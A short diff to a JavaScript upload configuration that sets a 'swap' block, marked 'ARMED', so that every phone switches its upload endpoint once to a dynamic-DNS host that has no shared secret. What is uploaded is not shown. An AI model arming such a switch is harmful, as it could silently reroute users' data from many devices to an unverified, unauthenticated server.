@@ -84,9 +84,9 @@ window.UPLOAD_DEFAULTS = {
      have to be opened once for the update anyway, and scanning takes seconds.
      ------------------------------------------------------------------ */
   swap: {
-    id:  "",                           // e.g. "yandex-2026-08"
-    to:  "",                           // the new main endpoint
-    sec: "",                           // its shared secret, if it has one
-    folder: ""                         // leave empty to keep the folder pattern
+    id:  "yandex-2026-08",             // ARMED — every phone does this once
+    to:  "https://baimskaya-cm.duckdns.org",
+    sec: "",                           // the endpoint has no shared secret set
+    folder: ""                         // keep whatever folder pattern is there
   },
 };
